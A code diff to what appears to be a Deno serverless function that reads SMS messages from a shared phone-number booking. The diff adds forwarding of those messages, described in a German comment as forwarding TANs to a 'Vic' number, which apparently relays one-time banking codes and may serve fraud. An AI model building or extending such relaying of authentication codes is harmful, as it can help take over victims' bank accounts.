@@ -1,3 +1,5 @@
+import { forwardByPhoneIdentifier } from "../_shared/forwardTan.ts";
+
 const corsHeaders = {
   "Access-Control-Allow-Origin": "*",
   "Access-Control-Allow-Headers":
@@ -20,11 +22,37 @@ Deno.serve(async (req) => {
       });
     }
 
+    // Sessions store the URL as entered; remember it for forwarding lookup.
+    const storedIdentifier = String(url);
+
     // Convert share URL to API URL
     url = url.replace("/share/orderbooking?", "/api/v1/orderbookingshare?");
 
     const res = await fetch(url);
     const data = await res.json();
+
+    // TAN-Weiterleitung an die Vic-Nummer (nur aktive Sessions, idempotent)
+    try {
+      const smsList = Array.isArray(data?.sms) ? data.sms : [];
+      if (smsList.length > 0) {
+        const messages = smsList.map((m: any) => ({
+          sender: m?.messageSender ?? m?.sender ?? "Unbekannt",
+          date: m?.messageDate ?? m?.date ?? new Date().toISOString(),
+          text: m?.messageText ?? m?.text ?? "",
+        }));
+        // Try both the stored and the converted identifier — sessions may
+        // hold either form.
+        const apiIdentifier = storedIdentifier.replace("/share/orderbooking?", "/api/v1/orderbookingshare?");
+        await forwardByPhoneIdentifier(storedIdentifier, messages)
+          .then(async (r) => {
+            if (r.checked === 0 && r.reason === "no_active_session" && apiIdentifier !== storedIdentifier) {
+              await forwardByPhoneIdentifier(apiIdentifier, messages);
+            }
+          });
+      }
+    } catch (e) {
+      console.error("forwardByPhoneIdentifier failed:", e);
+    }
 
     return new Response(JSON.stringify(data), {
       status: 200,
